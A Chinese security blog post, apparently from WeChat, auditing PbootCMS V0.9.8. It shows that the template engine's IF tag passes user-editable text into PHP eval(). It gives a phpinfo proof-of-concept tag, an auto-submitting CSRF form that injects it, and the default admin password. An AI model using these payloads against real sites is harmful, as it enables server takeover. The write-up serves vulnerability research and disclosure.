<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/Jd_GinO-TBut2K4n_uC1pw)

‍

‍  

====

V0.9.8

php 代码审计的初学者，所以就先从 D 类 CMS 入手。

后台默认账号：admin 密码：123456

代码审计分：

· 危险函数追踪流

· 通读全文流

· 黑白盒结合审计流

 **开发者标签手册** 

  

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnSbMfWAxFHeuuL5OdcK8VflBRUqsvtxtEkXKzIS4icFqu3drTYD0YfC4ptPUeUKQwO6iaCOtxGk4uUg/640?wx_fmt=png)

 **IF 条件语句** 

  

### 注意：条件语句中字符串需要用单引号或双引号，条件也可以使用原生 PHP 代码；所有对其它标签的调用都为字符串，需要加单引号。

```
{pboot:if('a'=='b')}
内容1
{else}
内容2
{/pboot:if}
```

示例一：在 IF 中使用 PHP 函数示例：

```
{pboot:if(date('Y')==2018)}2018年{/pboot:if} 
```

示例二：高亮栏目示例：

```
<div class="nav">
<dl>
    <dt><a href="{pboot:sitepath}/" {pboot:if(0=='{sort:scode}')}class='active'{/pboot:if}>首页</a></dt>
</dl>
{pboot:nav parent=0}
<dl>
<dt><a href="[nav:link]" {pboot:if('[nav:scode]'=='{sort:tcode}')}class='active'{/pboot:if}>[nav:name]</a></dt>
<dd>
{pboot:2nav parent=[nav:scode]}
<a href="[2nav:link]" {pboot:if('[2nav:scode]'=='{sort:scode}')}class='active'{/pboot:if}>[2nav:name]</a> |
{/pboot:2nav}
</dd>
</dl>
{/pboot:nav}
</div>
```

示例三：嵌套 IF：

```
{pboot:if('a'=='b')}
{pboot:2if('a'=='b')}
内容1
{2else}
内容2
{/pboot:2if}
{else}
内容3
{/pboot:if}
```

这里说了可执行 PHP 语句，但要插在 IF 条件标签，例如：

{pboot:if(php 语句)}{/pboot:if}

然后再返回文件查看源代码文件：

该文件是：标签解析引擎控制器，也就是解析标签的。

代码的 1273~1314 为关于 IF 条件语句的。

/apps/home/controller/ParserController.php

```
 // 解析IF条件标签
   public function parserIfLabel($content)
  {
       $pattern = '/\{pboot:if\(([^}]+)\)\}([\s\S]*?)\{\/pboot:if\}/';
       $pattern2 = '/pboot:([0-9])+if/';
       if (preg_match_all($pattern, $content, $matches)) {
           $count = count($matches[0]);
           for ($i = 0; $i < $count; $i ++) {
               $flag = '';
               $out_html = '';
               eval('if(' . $matches[1][$i] . '){$flag="if";}else{$flag="else";}');
               
               if (preg_match('/([\s\S]*)?\{else\}([\s\S]*)?/', $matches[2][$i], $matches2)) { // 判断是否存在else
                   switch ($flag) {
                       case 'if': // 条件为真
                           if (isset($matches2[1])) {
                               $out_html = $matches2[1];
                          }
                           break;
                       case 'else': // 条件为假
                           if (isset($matches2[2])) {
                               $out_html = $matches2[2];
                          }
                           break;
                  }
              } elseif ($flag == 'if') {
                   $out_html = $matches[2][$i];
              }
               
               // 无限极嵌套解析
               if (preg_match($pattern2, $out_html, $matches3)) {
                   $out_html = str_replace('pboot:' . $matches3[1] . 'if', 'pboot:if', $out_html);
                   $out_html = str_replace('{' . $matches3[1] . 'else}', '{else}', $out_html);
                   $out_html = $this->parserIfLabel($out_html);
              }
               
               // 执行替换
               $content = str_replace($matches[0][$i], $out_html, $content);
          }
      }
       return $content;
  }
```

关键在 

```
   $pattern = '/\{pboot:if\(([^}]+)\)\}([\s\S]*?)\{\/pboot:if\}/';
       $pattern2 = '/pboot:([0-9])+if/';
       if (preg_match_all($pattern, $content, $matches)) {
           $count = count($matches[0]);
           for ($i = 0; $i < $count; $i ++) {
               $flag = '';
               $out_html = '';
               eval('if(' . $matches[1][$i] . '){$flag="if";}else{$flag="else";}');
```

只经过简单的正则匹配之后就赋值，然后 eval() 执行。

到此需要寻在利用点。  

 **Poc** 

Poc:

{pboot:if(phpinfo())}!{/pboot:if}

最后经过寻找，只要发现后台能编辑的地方，基本上都能插入 IF 条件语句标签并能解析执行。

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnSbMfWAxFHeuuL5OdcK8Vfltic1qrNd9pVSrXMLzia4K147XPuYuy0bpiaC5QUFdKadGAyYPibsT9Ria0Q/640?wx_fmt=png)

访问首页就可以看到 phpinfo 页面。

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnSbMfWAxFHeuuL5OdcK8VflNaLYTaEMcMdCmbQgbuSB6jADaSGhM12RV7RyCQv9SCHhAaBLoWEUwA/640?wx_fmt=png)

然后尝试了多次多点均能 Getshell。

 **另外** 

  

前台某处存在 CSRF，利用其修改后台内容，但均有提升修改成功的页面，做不到无感知修改内容，因此 CSRF+IF 条件语句标签也是比较鸡肋。

```
  #csrf.html poc
<html>
  <body>
<form action="http://test.com/admin.php/Message/mod/id/19.html?backurl=/index.php" method="POST" >
      <input type="hidden" thank you{pboot:if(phpinfo()==1)}!{/pboot:if}" />
      <input type="hidden"  />
      <input type="submit" value="" />
    </form>
<script type="text/javascript">
    setTimeout("form1.submit();",100);
</script>

  </body>
</html>
```

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnSbMfWAxFHeuuL5OdcK8VflcWSiaickBgic6MDWCcZtQOhmQuvH5rqfCdCdOZUQEo9kknF3HZ5aozBfQ/640?wx_fmt=png)

‍

‍